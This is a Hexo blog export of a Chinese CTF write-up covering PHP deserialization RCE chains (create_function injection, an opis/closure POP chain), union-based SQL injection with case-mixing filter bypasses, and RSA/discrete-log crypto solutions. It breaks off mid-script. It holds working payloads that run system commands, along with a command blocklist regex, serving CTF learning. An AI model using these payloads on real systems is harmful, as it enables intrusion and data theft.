{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"DASCTF九月挑战赛","slug":"DASCTF九月挑战赛","date":"2021-10-09T06:17:12.000Z","updated":"2021-10-09T06:17:43.704Z","comments":true,"path":"2021/10/09/DASCTF九月挑战赛/","link":"","permalink":"http://example.com/2021/10/09/DASCTF%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/","excerpt":"DASCTF九月赛webhellounser 一道php反序列化的题目： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpclass A &#123; public $var; public function show()&#123; echo $this-&gt;var; &#125; public function __invoke()&#123; $this-&gt;show(); &#125;&#125;class B&#123; public $func; public $arg; public function show()&#123; $func = $this-&gt;func; if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $this-&gt;func) || preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#x27;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i&#x27;, $this-&gt;arg)) &#123; die(&#x27;No!No!No!&#x27;); &#125; else &#123; include &quot;flag.php&quot;; //There is no code to print flag in flag.php $func(&#x27;&#x27;, $this-&gt;arg); &#125; &#125; public function __toString()&#123; $this-&gt;show(); return &quot;&lt;br&gt;&quot;.&quot;Nice Job!!&quot;.&quot;&lt;br&gt;&quot;; &#125; &#125;if(isset($_GET[&#x27;pop&#x27;]))&#123; $aaa = unserialize($_GET[&#x27;pop&#x27;]); $aaa();&#125;else&#123; highlight_file(__FILE__);&#125;?&gt;","text":"DASCTF九月赛webhellounser 一道php反序列化的题目： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpclass A &#123; public $var; public function show()&#123; echo $this-&gt;var; &#125; public function __invoke()&#123; $this-&gt;show(); &#125;&#125;class B&#123; public $func; public $arg; public function show()&#123; $func = $this-&gt;func; if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $this-&gt;func) || preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#x27;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i&#x27;, $this-&gt;arg)) &#123; die(&#x27;No!No!No!&#x27;); &#125; else &#123; include &quot;flag.php&quot;; //There is no code to print flag in flag.php $func(&#x27;&#x27;, $this-&gt;arg); &#125; &#125; public function __toString()&#123; $this-&gt;show(); return &quot;&lt;br&gt;&quot;.&quot;Nice Job!!&quot;.&quot;&lt;br&gt;&quot;; &#125; &#125;if(isset($_GET[&#x27;pop&#x27;]))&#123; $aaa = unserialize($_GET[&#x27;pop&#x27;]); $aaa();&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 照常先来看入口点，在反序列化后立刻函数式调用了该对象，那么可以触发的就是__invoke函数。 __invoke函数内部调用了同类中的show函数，其中将变量$var作为字符串打印，那么可以触发__toString函数。 __toString函数也调用了同类中的show函数，包含了flag.php并且可以控制调用的函数名和第二个参数。 这里我们可以确定使用create_funtion逃逸，使用;&#125;;var_dump(get_defined_vars());//来逃逸出大括号。 但是这分别对func和arg做了过滤，那么我们分析如何绕过： preg_match(&#39;/^[a-z0-9]*$/isD&#39;, $this-&gt;func)，限制不能所有的字符都是字母或者数字，那么我们可以使用\\create_function来绕过。而这个\\代表该函数是全局空间下的名称。 arg变量限制了很多系统命令和php函数，但是没有限制system函数。过滤了引号，那么我们可以不用引号，只要命令中间没有空格（当然不加引号似乎只在php5生效，我用自己电脑上的php8是不能执行的）。 生成payload： 1234567891011121314&lt;?phpclass A &#123; public $var;&#125;class B&#123; public $func = &#x27;\\create_function&#x27;; public $arg = &#x27;;&#125;;var_dump(get_defined_vars());//&#x27;; &#125;$a = new A();$a -&gt; var = new B();echo urlencode(serialize($a)); 1O%3A1%3A%22A%22%3A1%3A%7Bs%3A3%3A%22var%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A4%3A%22func%22%3Bs%3A16%3A%22%5Ccreate_function%22%3Bs%3A3%3A%22arg%22%3Bs%3A34%3A%22%3B%7D%3Bvar_dump%28get_defined_vars%28%29%29%3B%2F%2F%22%3B%7D%7D 回显： 1array(2) &#123; [&quot;func&quot;]=&gt; string(16) &quot;\\create_function&quot; [&quot;FakeFlag&quot;]=&gt; string(33) &quot;fl4g&#123;TrueFlag_is_in_Tru3flag.php&#125;&quot; &#125; 那么我们就需要去查看Tru3flag.php： 1public $arg = &#x27;;&#125;;system(ls);//&#x27;; 回显： 1Tru3flag.php flag.php index.php 单词命令是可以执行的，但是cat Tru3flag.php肯定会存在空格，就算将其base64之类的也不行，用引号（这里不让）在本地也失败。所以我们只能再嵌套一层base64_decode函数： 1public $arg = &#x27;;&#125;;system(base64_decode(Y2F0IFRydTNmbGFnLnBocDsg));//&#x27;; 注意base64编码不能有等号，因为等号也被过滤了，我的方法也很简单，在后面加一个空格就可以了。 不过base64编码后触发了nl（笑），这里我们用cat Tru*再编码： 1public $arg = &#x27;;&#125;;system(base64_decode(Y2F0IFRydSoK));//&#x27;; 获得flag： 1flag&#123;b8b2da7c-260a-41b1-9080-90cafcf9a973&#125; 当然也可以用取反绕过： 12345678910111213141516&lt;?phpclass A &#123; public $var;&#125;class B&#123; public $func = &#x27;\\create_function&#x27;; public $arg; &#125;$a = new A();$a -&gt; var = new B();$ac = (~(&#x27;php://filter/read=convert.base64-encode/resource=Tru3flag.php&#x27;));$a -&gt; var -&gt; arg = &#x27;return(1);&#125;require(~(&#x27;.strval($ac).&#x27;));//&#x27;;echo urlencode(serialize($a)); xxc 打开网页提示一条链子，使用dirmap扫描到网站源码www.zip，进行代码审计。 index.php其中存在反序列化操作，这道题确定是一道序列化的题目： 123456789101112&lt;?phpinclude(&quot;closure/autoload.php&quot;);function _loader($class)&#123; require_once &#x27;./class/&#x27; . (str_replace(&#x27;\\\\&#x27;, &#x27;/&#x27;, $class) . &#x27;.php&#x27;);&#125;spl_autoload_register(&quot;_loader&quot;);error_reporting(0);if($_POST[&#x27;data&#x27;])&#123; unserialize(base64_decode($_POST[&#x27;data&#x27;]));&#125;else&#123; echo &quot;&lt;h1&gt;一条链子&lt;/h1&gt;&quot;;&#125; 我们先来学习一下_loader函数，这是一个自动加载函数，在PHP5中，当我们实例化一个未定义的类时，就会触发此函数。 spl_autoload_register(&#39;loadprint&#39;)与__autoload函数有异曲同工之妙，PHP碰到没有定义的类就执行loadprint函数。 所以我们在index.php中可以自由的实例化存在的类。由于是反序列化的题目，我们先来看看入口点__destruct和__wakeup函数是否存在： \\Control\\State\\StopHook.php中发现了析构函数，调用了同类中的_exit函数，其中$process-&gt;stop();可能会触发__call函数，而!$process-&gt;isRunning可能会触发__get函数： 1234567891011121314151617181920212223&lt;?phpnamespace Control\\State;class StopHook &#123; protected $output; protected $config = [&#x27;auto&#x27; =&gt; 0]; protected static $states = [&#x27;started&#x27;, &#x27;running&#x27;, &#x27;finished&#x27;, &#x27;waiting&#x27;, &#x27;fail&#x27;]; protected $processes; public function __destruct() &#123; $this-&gt;_exit(); &#125; private function _exit() &#123; foreach(array_reverse($this-&gt;processes) as $process) &#123; if (!$process-&gt;isRunning) &#123; continue; &#125; $process-&gt;stop(); &#125; &#125;&#125; 在\\Faker\\MyGenerator.php中找到这两个函数，__call函数中echo $this-&gt;defaultCall;一句可能会触发__toString函数： 12345678910111213141516&lt;?phpnamespace Faker;class MyGenerator &#123; protected $defaultValue; public function __call($method, $arg_array) &#123; echo $this-&gt;defaultCall; return $this-&gt;defaultCall; &#125; public function __get($property) &#123; return $this-&gt;defaultValue; &#125;&#125; 在\\Method\\Func\\GetFile.php找到__toString函数，调用了同类中的getFiles函数，发现函数的中调用了isset函数，如果该类中不存在该属性，会触发__isset函数： 1234567891011121314151617181920212223242526&lt;?phpnamespace Method\\Func;class GetFile &#123; private $flag = true; private $files = []; public function __toString() &#123; return $this-&gt;getFiles(); &#125; public function getFiles() &#123; if (!$this-&gt;flag) return &quot;denied&quot;; $s = &quot;&quot;; if (isset($this-&gt;flag-&gt;&#123;$this-&gt;value&#125;)) &#123; return &quot;test&quot;; &#125; foreach ($this-&gt;files as $file) &#123; $s += $file-&gt;read(); &#125; return $s; &#125;&#125; 在Method\\Func\\GetDefault.php中找到__isset函数，调用了同类中的popup函数，其中return $s($length);可能会触发__invoke函数： 123456789101112131415161718192021&lt;?phpnamespace Method\\Func;class GetDefault &#123; private $source; public function popup($length) &#123; $s = $this-&gt;source; if ($s-&gt;flag != &quot;myTest&quot;) &#123; return &quot;denied&quot;; &#125; return $s($length); &#125; public function __isset($property) &#123; if ($property != &quot;test&quot;) &#123; return false; &#125; return !$this-&gt;popup(666); &#125;&#125; 最后在\\Method\\Func\\GenerateFile.php中找到__invoke函数，且存在call_user_func。没有想到在php5中是可以直接赋值在一个没有初始化的变量上的2333。 1234567891011121314151617&lt;?phpnamespace Method\\Func;class GenerateFile &#123; public $flag; protected $buffer; public function __invoke($param) &#123; $this-&gt;myGen($param); &#125; public function myGen($length) &#123; $s = $this-&gt;buffer-&gt;read; call_user_func($this-&gt;source-&gt;generate, $length); return $s; &#125;&#125; 整个链子理清楚了，但是发现call_user_func的第二个参数被写死了，因为$this-&gt;popup(666);调用的时候将666传入了__invoke($param)，最后也就作为$length变量传入了myGen($length)函数。 现在只能够调用类似phpinfo等不需要参数的函数，并不能够rce，该怎么办呢？ 这时候我们注意到存在function.php，发现这个cms是基于opis/closure搭建的，网址：https://github.com/opis/closure 该项目是用来闭包类对象的，官方文档：https://opis.io/closure/3.x/serialize.html。php中的闭包函数（仅对php）即匿名函数，一般是无法进行序列化的，一般会报错： 123&lt;?php$function = function()&#123; eval(system(&#x27;ls&#x27;)); &#125;;echo serialize($function); 1Fatal error: Uncaught exception &#x27;Exception&#x27; with message &#x27;Serialization of &#x27;Closure&#x27; is not allowed&#x27; 使用这个项目，可以将闭包包装成一个Opis\\Closure\\SerializableClosure对象，然后使用标准的serialize进行序列化。也可以使用Opis\\Closure\\serialize函数序列化任意对象。 12345&lt;?phprequire &#x27;closure/autoload.php&#x27;;$function = function()&#123; eval(system(&#x27;ls&#x27;)); &#125;;$a = new \\Opis\\Closure\\SerializableClosure($function);echo serialize($a); 1234&lt;?phprequire &#x27;closure/autoload.php&#x27;;$function = function()&#123; eval(system(&#x27;ls&#x27;)); &#125;;echo \\Opis\\Closure\\serialize($function); 1C:32:&quot;Opis\\Closure\\SerializableClosure&quot;:156:&#123;a:5:&#123;s:3:&quot;use&quot;;a:0:&#123;&#125;s:8:&quot;function&quot;;s:33:&quot;function()&#123; eval(\\system(&#x27;ls&#x27;));&#125;&quot;;s:5:&quot;scope&quot;;N;s:4:&quot;this&quot;;N;s:4:&quot;self&quot;;s:32:&quot;0000000054d6224100000000237e90a4&quot;;&#125;&#125; 那么我们可以将匿名函数通过serialize函数经过一次序列化和反序列化，这样他就能作为SerializableClosure对象被序列化。或者直接将generate变量赋值为SerializableClosure类。 payload： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phpnamespace Control\\State &#123; class StopHook &#123; protected $processes; public function __construct() &#123; $this -&gt; processes = array(new \\Faker\\MyGenerator()); &#125; &#125; require &#x27;closure/autoload.php&#x27;; $payload = new StopHook(); echo base64_encode(serialize($payload));&#125;namespace Faker &#123; class MyGenerator &#123; protected $defaultValue; public function __construct() &#123; $this -&gt; defaultValue = new \\Method\\Func\\GetFile(); &#125; &#125;&#125;namespace Method\\Func&#123; class GetFile &#123; private $flag; public function __construct() &#123; $this -&gt; flag = new \\Method\\Func\\GetDefault(); $this -&gt; value = &#x27;test&#x27;; &#125; &#125;&#125;namespace Method\\Func&#123; class GetDefault &#123; private $source; public function __construct() &#123; $this -&gt; source = new \\Method\\Func\\GenerateFile(); $this -&gt; source -&gt; flag = &#x27;myTest&#x27;; &#125; &#125;&#125;namespace Method\\Func&#123; class GenerateFile &#123; public $flag; protected $buffer; public function __construct() &#123; $function = function()&#123; eval(system(&#x27;ls /&#x27;)); &#125;; $this -&gt; source -&gt; generate = new \\Opis\\Closure\\SerializableClosure($function); &#125; &#125;&#125; 将php文件放在/www文件夹下运行，得到序列化的结果（其实在php5中赋值一个对象在一个空变量中是会警告的HP Warning: Creating default object from empty value in /var/www/1.php on line 51，在php8中就直接报错了）： 1TzoyMjoiQ29udHJvbFxTdGF0ZVxTdG9wSG9vayI6MTp7czoxMjoiACoAcHJvY2Vzc2VzIjthOjE6e2k6MDtPOjE3OiJGYWtlclxNeUdlbmVyYXRvciI6MTp7czoxNToiACoAZGVmYXVsdFZhbHVlIjtPOjE5OiJNZXRob2RcRnVuY1xHZXRGaWxlIjoyOntzOjI1OiIATWV0aG9kXEZ1bmNcR2V0RmlsZQBmbGFnIjtPOjIyOiJNZXRob2RcRnVuY1xHZXREZWZhdWx0IjoxOntzOjMwOiIATWV0aG9kXEZ1bmNcR2V0RGVmYXVsdABzb3VyY2UiO086MjQ6Ik1ldGhvZFxGdW5jXEdlbmVyYXRlRmlsZSI6Mzp7czo0OiJmbGFnIjtzOjY6Im15VGVzdCI7czo5OiIAKgBidWZmZXIiO047czo2OiJzb3VyY2UiO086ODoic3RkQ2xhc3MiOjE6e3M6ODoiZ2VuZXJhdGUiO0M6MzI6Ik9waXNcQ2xvc3VyZVxTZXJpYWxpemFibGVDbG9zdXJlIjoxODg6e2E6NTp7czozOiJ1c2UiO2E6MDp7fXM6ODoiZnVuY3Rpb24iO3M6MzU6ImZ1bmN0aW9uKCl7IGV2YWwoc3lzdGVtKCdscyAvJykpOyB9IjtzOjU6InNjb3BlIjtzOjI0OiJNZXRob2RcRnVuY1xHZW5lcmF0ZUZpbGUiO3M6NDoidGhpcyI7TjtzOjQ6InNlbGYiO3M6MzI6IjAwMDAwMDAwMmIzZjg4ZGMwMDAwMDAwMDE5NjUyZjhjIjt9fX19fXM6NToidmFsdWUiO3M6NDoidGVzdCI7fX19fQ== 将作为post参数data传递，获得回显： 1bin dev etc f1@g.txt home lib media mnt opt proc root run sbin srv sys tmp usr var 修改$function = function()&#123; eval(system(&#39;cat /fl@g.txt&#39;)); &#125;;，重新序列化： 1TzoyMjoiQ29udHJvbFxTdGF0ZVxTdG9wSG9vayI6MTp7czoxMjoiACoAcHJvY2Vzc2VzIjthOjE6e2k6MDtPOjE3OiJGYWtlclxNeUdlbmVyYXRvciI6MTp7czoxNToiACoAZGVmYXVsdFZhbHVlIjtPOjE5OiJNZXRob2RcRnVuY1xHZXRGaWxlIjoyOntzOjI1OiIATWV0aG9kXEZ1bmNcR2V0RmlsZQBmbGFnIjtPOjIyOiJNZXRob2RcRnVuY1xHZXREZWZhdWx0IjoxOntzOjMwOiIATWV0aG9kXEZ1bmNcR2V0RGVmYXVsdABzb3VyY2UiO086MjQ6Ik1ldGhvZFxGdW5jXEdlbmVyYXRlRmlsZSI6Mzp7czo0OiJmbGFnIjtzOjY6Im15VGVzdCI7czo5OiIAKgBidWZmZXIiO047czo2OiJzb3VyY2UiO086ODoic3RkQ2xhc3MiOjE6e3M6ODoiZ2VuZXJhdGUiO0M6MzI6Ik9waXNcQ2xvc3VyZVxTZXJpYWxpemFibGVDbG9zdXJlIjoxOTc6e2E6NTp7czozOiJ1c2UiO2E6MDp7fXM6ODoiZnVuY3Rpb24iO3M6NDQ6ImZ1bmN0aW9uKCl7IGV2YWwoc3lzdGVtKCdjYXQgL2YxQGcudHh0JykpOyB9IjtzOjU6InNjb3BlIjtzOjI0OiJNZXRob2RcRnVuY1xHZW5lcmF0ZUZpbGUiO3M6NDoidGhpcyI7TjtzOjQ6InNlbGYiO3M6MzI6IjAwMDAwMDAwNzBkY2RiODIwMDAwMDAwMGFiNmZiZTVmIjt9fX19fXM6NToidmFsdWUiO3M6NDoidGVzdCI7fX19fQ== 获得flag： 1flag&#123;16ed60c5-d06f-4974-931b-a26b07b5618d&#125; ctfmanage 打开题目是一个登录框，加上字母发现直接报错，发现使用的是登录号，所以登录名是一个数字型参数，没有单引号包裹，而密码是一个字符型参数： 尝试输入用户名1 or 1=1#，发现被过滤，使用fuzz字典跑一下过滤值： 想到用union联合注入，尝试了很多次但是没有成功，后来发现可以大小写绕过（笑，现在怎么这么多双层防护的题目） 121 Union Select 1,2,3;#1 Union Select 1,2,database();# =&gt; ctf 由于or被过滤了，所以这里需要使用无表名注入，且from和where都需要大小写绕过： 1231 Union Select 1,2,group_concat(table_name) From sys.schema_table_statistics_with_buffer Where table_schema=database();# =&gt; 没有输出1 Union Select 1,2,group_concat(table_name) From mysql.innodb_table_stats Where database_name = database();#=&gt; flagisthere,ilikectf 接下来就是无列名注入，以下两个payload都失败了： 121 Union Select 1,2,`3` From (Select 1,2,3 Union Select * From ilikectf);#1 Union Select 1,2,b From (Select 1,2,3 As b,4,5 Union Select * From ilikectf)a;# 最后使用下面式子成功： 11 Union Select * From ilikectf;# =&gt; 36476,sgrsgef,gg.php 来到gg.php： 1234567891011121314151617&lt;?phperror_reporting(0);include &quot;flag.php&quot;;if(base64_encode(hex2bin(strrev(bin2hex($_GET[&#x27;sy&#x27;]))))===$secret)&#123; if($_POST[&#x27;ha&#x27;]!==$_POST[&#x27;lo&#x27;]&amp;&amp;md5($_POST[&#x27;ha&#x27;])===md5($_POST[&#x27;lo&#x27;]))&#123; echo $flag; &#125; else&#123; echo &#x27;ohhhhh so close !!!&#x27;; &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 后一个是md5数组绕过。另外一个$secret变量，让我们回想起首页页面源代码中的字符： 1&lt;!-- 告诉你一个秘密: hjZX1pcnVmdmRzZWZ/bGlg== --&gt; 将其反过来解密即可： 12&lt;?phpecho hex2bin(strrev(bin2hex(base64_decode(&#x27;hjZX1pcnVmdmRzZWZ/bGlg==&#x27;)))); 1ilovectfverymuch 所以最后的payload： 1234GET:?sy=ilovectfverymuchPOST:ha[]=a&amp;lo[]=b 获得flag： 1flag&#123;23c2e3e4-d2f8-4770-9c7d-84142263a47a&#125; crypto签到 题目： 1234567891011121314#!/usr/bin/env python# -*- coding: utf-8 -*-from Crypto.Util.number import *import randomflag=b&#x27;flag&#123;******************&#125;&#x27;n = 2 ** 256flaglong=bytes_to_long(flag)m = random.randint(2, n-1) | 1c = pow(m, flaglong, n)print(&#x27;m = &#x27; + str(m))print(&#x27;c = &#x27; + str(c))# m = 73964803637492582853353338913523546944627084372081477892312545091623069227301# c = 21572244511100216966799370397791432119463715616349800194229377843045443048821 这道题有点特殊，是使用$2^{256}$次方作为模，flaglong作为加密指数e，列出等式有： m^{flaglong}=c\\pmod {2^{256}}spmpy库 已知条件m、c，求解flaglong，这是一个标准的离散对数问题，可以通过sage求解，也可以使用python的spmpy库中的discrete_log函数。 12345678from sympy.ntheory import discrete_logimport libnumn = 2 ** 256m = 73964803637492582853353338913523546944627084372081477892312545091623069227301c = 21572244511100216966799370397791432119463715616349800194229377843045443048821flag = discrete_log(n, c, m)print(libnum.n2s(int(flag))) 获得flag： 1flag&#123;DASCTF_zjut&#125; sage12345678sage: n = 2 ** 256sage: m = 73964803637492582853353338913523546944627084372081477892312545091623069227301sage: c = 21572244511100216966799370397791432119463715616349800194229377843045443048821sage: ZmodN = Zmod(n)sage: m = ZmodN(m)sage: c = ZmodN(c)sage: hex(c.log(m))&#x27;0x666c61677b4441534354465f7a6a75747d&#x27; 将十六进制转换成字符： rsa1 题目： 1234-&gt; % nc node4.buuoj.cn 28410n: 0x57b08bc1c82237cf614735562d4fe2a07570813b6c726537f83449df9be01e538bb765993001658f3c879f189620ad628517dda951a0103a88f7b28a9ee631fc365ee3e9f0ce558cf20eac76893bb7c0b49ed68506fcba1bb341eca59e7a2e4ce9bd31bfc03d6037cd565b6eae375e0e0b9084a352e820e02405597845871f62ee92eeba2f8de71f8af784a51ca83bd767b4f52908a853aae6efbf58db16a14c1fbf51c47f9613e21906f16fe14595d706f75555462cc7aea6b62ef558c6b74329ad182b308122f99cab95bc93ba6f9f9cfd29407b582404bfb11b45e1d5fa13372c174395306a6eb5c60651736f776e353b2eb8da356bded79bea7e4a1e212ac37b1d59e1356fcbcec8065642c318b1e908f54745aa7467c680ed6f2716fb3efd9843122dccbbdb6698fe1e31a2390682e03d175e0bf7591b8201ad14d1d8f02a3fcbea0b864e52895e588390e4a785ce94bf0b5b7b6a59c5f92ae214b846ffebf52b5a71dc286adc4d1755acd6b9e1b9e41cf0b1267c6433dabb708828d5b5b16638299b76c1645988e974b0f0215f8eee31f44503624d75b67519ad5c50e9924006bd64869d1a822cf927effedd570f4cbe110d8478e1ac10c95b754f05151b7eb146c226fa443655a12af864bdb3d30fce492840763775e487dd963b5fb292fbd8ca702c1be458d941177782f96edf489d021312cb082f9e01a824440e07Le: 0x77859f7f91ed390f5a7f6fdf76824c0468ae4bcde36f86fdca3a773915af3c9a8d173fcfd71a0e7782166147ca46e6d6fc32f91e6db3585d9998246dfcb163cdf9f9bad948daf005299a3c92eeef4a1ce2e78f5428608856c8b88ff3ff7b8fc3bd1a50ecbc10af5992801a0ccf92f00347a107e6856b97a16ead0f8143bd95b4614f1ba8836bb281ca2a01910c78fa99d7b7b25a224baa8403975e48105b7afd5d07d745d2be993e14c14c3de7c9b53e8d3e70420e182dbbc1b85347a517f7d93ebbcf8c0c41c234aefaa434bdad4db01ba50d8a596bf96b42da77f476056871b50d1eea18825dfe0741dba92daf33aef3b0dda2fa63a92a3cf8745044285c6c6f063754e2fe711b6dfe0557415be5dfe5b037fcce577428beada47b61a780e69a0273da11e4f0b236f3e39d471ddd17b40a7e6b05918acc668a379e17c3e857423b30699401d468b4aef7b8fa60c4dedfdb1092f46f83fecda984836b23e20436b88e5eea9d71198b966c0a0126e5063e182d822c1b72c39078a173a207677dca0599024f573f2d237177c7b70b7286c80dddd89838ba7f16e85b8ce57bc5ecf079b9cc4d9d8d633ec75d13ca1630e3ba83edbead13e50ba8ec9b68424aa88d455cdf566b607308f02e326f4d6a7673a4e2fa342b725b98a4798a54ca974cf2c28d0e79a622a19a26f1ff6340c831d08b3fdadbe48d162b1e57952bc9bbb643LYour flag is: 0x9eed6ec9e43e4405c0dc6f62b7ceab3f9c744d64c4262848739447924e55e2c0462d50a7b528bd4dbee136ec8725a8374078a277786e1167c08fb0bfe8fe76c94f291f56a6a478e9d9e000efd09381f228d9567132dec682413ab38483734d31c37f127dc9e172f3aab101edc2a2ba843ecf3f9f76ba7a52dc99ad63c307cb4a9183109b5b67d51c30c5e7279012c0e234c2e8c3ff182bb398e7f69c29bf1fa950d2158fb98086c5a829a6b4616f1488df7d80346805975e39d1e3e96c5dfd5e01239ec6a5a9b0391ec5b9c0b0def3f4c688ec4d54f5a96d7121d6980d80e896aec740e86567500efc21c4adc000ea19dfab5c68e5d07bef977acedfdc3d647cdf491c8aee9d96b7445d3a8df1ee3229ed23542b8e632a77e9778482908c297858e17f3964e2d82077c76036bd01db5bec483308d651f7b1e5a9c3fe2e2678331929d01e81a488b10ac5c0723e9cf586acaa2d9f061db291bb83e41f94f98a7b8ea5939ddc91c4de57a9271b71dab42d3cf8b6b0b35dbea8d6d564aba05fdbaad82846e29c37cec8b994c209be616ae167bfea11d97297ddd46a61264ae0c0fbb129bd20d12f9a6b3b7a162e1978151b2191406fbad79775a26a122724f5d5194a6362b62bd070f8e36efec0a507e5c8b92fbd69f0ba76584c260766cc6d99b3933e9d2d77f0d06bab7469dd612d79563084bfd886edb129b5f5d2eb00c3edL 题目： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#! /usr/bin/env python# -*- coding: utf-8 -*-from flag import get_flagfrom hashlib import sha512from Crypto.Util.number import getPrime,bytes_to_longfrom libnum import invmod, gcdimport randomdef m_exit(n): print &quot;==============Game Over!=================&quot; exit(n)def cal_bit(num): num = int(num) l = len(bin(num)) return l-2def pi_b(x): bt = 536380958350616057242691418634880594502192106332317228051967064327642091297687630174183636288378234177476435270519631690543765125295554448698898712393467267006465045949611180821007306678935181142803069337672948471202242891010188677287454504933695082327796243976863378333980923047411230913909715527759877351702062345876337256220760223926254773346698839492268265110546383782370744599490250832085044856878026833181982756791595730336514399767134613980006467147592898197961789187070786602534602178082726728869941829230655559180178594489856595304902790182697751195581218334712892008282605180395912026326384913562290014629187579128041030500771670510157597682826798117937852656884106597180126028398398087318119586692935386069677459788971114075941533740462978961436933215446347246886948166247617422293043364968298176007659058279518552847235689217185712791081965260495815179909242072310545078116020998113413517429654328367707069941427368374644442366092232916196726067387582032505389946398237261580350780769275427857010543262176468343294217258086275244086292475394366278211528621216522312552812343261375050388129743012932727654986046774759567950981007877856194574274373776538888953502272879816420369255752871177234736347325263320696917012616273L return invmod(x, bt)def get_ed(p, q): k = cal_bit(q*p) phi_n = (p-1)*(q-1) r = random.randint(10, 99) while True: u = getPrime(k/4 - r) if gcd(u, phi_n) != 1: continue t = invmod(u, phi_n) e = pi_b(t) if gcd(e, phi_n) == 1: break d = invmod(e, phi_n) return (e, d)def main(): flag = get_flag() p=getPrime(2048) q=getPrime(2048) n = p * q e, d = get_ed(p, q) print &quot;n: &quot;, hex(n) print &quot;e: &quot;, hex(e) flag = bytes_to_long(flag) enc_flag = pow(flag, e, n) print &quot;Your flag is: &quot;, hex(enc_flag) if __name__ == &#x27;__main__&#x27;: main() 由题目可知，这道题的不同之处在于e是由特殊方法生成的。而条件中$u\\lt\\frac {1}{4}n$，我们可以对t进行wiener攻击。且维纳攻击时，是将$\\phi(n)$爆破出来的，所以稍微修改hackRSA函数，让其返回$\\varphi(n)$即可。 然后通过逆元计算出d，直接解密即可。这道题的出题人博客：https://www.secpulse.com/archives/53600.html。虽然我也不知道为啥需要分解p、q的算法，但是以后可能用得着就先记录在这里了。 wiener攻击项目：https://github.com/pablocelayes/rsa-wiener-attack 1234567891011121314151617181920212223242526272829303132333435363738394041from libnum import invmod, gcd, n2sfrom gmpy2 import *import ContinuedFractions, Arithmetic, RSAvulnerableKeyGeneratorn = 0x57b08bc1c82237cf614735562d4fe2a07570813b6c726537f83449df9be01e538bb765993001658f3c879f189620ad628517dda951a0103a88f7b28a9ee631fc365ee3e9f0ce558cf20eac76893bb7c0b49ed68506fcba1bb341eca59e7a2e4ce9bd31bfc03d6037cd565b6eae375e0e0b9084a352e820e02405597845871f62ee92eeba2f8de71f8af784a51ca83bd767b4f52908a853aae6efbf58db16a14c1fbf51c47f9613e21906f16fe14595d706f75555462cc7aea6b62ef558c6b74329ad182b308122f99cab95bc93ba6f9f9cfd29407b582404bfb11b45e1d5fa13372c174395306a6eb5c60651736f776e353b2eb8da356bded79bea7e4a1e212ac37b1d59e1356fcbcec8065642c318b1e908f54745aa7467c680ed6f2716fb3efd9843122dccbbdb6698fe1e31a2390682e03d175e0bf7591b8201ad14d1d8f02a3fcbea0b864e52895e588390e4a785ce94bf0b5b7b6a59c5f92ae214b846ffebf52b5a71dc286adc4d1755acd6b9e1b9e41cf0b1267c6433dabb708828d5b5b16638299b76c1645988e974b0f0215f8eee31f44503624d75b67519ad5c50e9924006bd64869d1a822cf927effedd570f4cbe110d8478e1ac10c95b754f05151b7eb146c226fa443655a12af864bdb3d30fce492840763775e487dd963b5fb292fbd8ca702c1be458d941177782f96edf489d021312cb082f9e01a824440e07e = 0x77859f7f91ed390f5a7f6fdf76824c0468ae4bcde36f86fdca3a773915af3c9a8d173fcfd71a0e7782166147ca46e6d6fc32f91e6db3585d9998246dfcb163cdf9f9bad948daf005299a3c92eeef4a1ce2e78f5428608856c8b88ff3ff7b8fc3bd1a50ecbc10af5992801a0ccf92f00347a107e6856b97a16ead0f8143bd95b4614f1ba8836bb281ca2a01910c78fa99d7b7b25a224baa8403975e48105b7afd5d07d745d2be993e14c14c3de7c9b53e8d3e70420e182dbbc1b85347a517f7d93ebbcf8c0c41c234aefaa434bdad4db01ba50d8a596bf96b42da77f476056871b50d1eea18825dfe0741dba92daf33aef3b0dda2fa63a92a3cf8745044285c6c6f063754e2fe711b6dfe0557415be5dfe5b037fcce577428beada47b61a780e69a0273da11e4f0b236f3e39d471ddd17b40a7e6b05918acc668a379e17c3e857423b30699401d468b4aef7b8fa60c4dedfdb1092f46f83fecda984836b23e20436b88e5eea9d71198b966c0a0126e5063e182d822c1b72c39078a173a207677dca0599024f573f2d237177c7b70b7286c80dddd89838ba7f16e85b8ce57bc5ecf079b9cc4d9d8d633ec75d13ca1630e3ba83edbead13e50ba8ec9b68424aa88d455cdf566b607308f02e326f4d6a7673a4e2fa342b725b98a4798a54ca974cf2c28d0e79a622a19a26f1ff6340c831d08b3fdadbe48d162b1e57952bc9bbb643cipher = 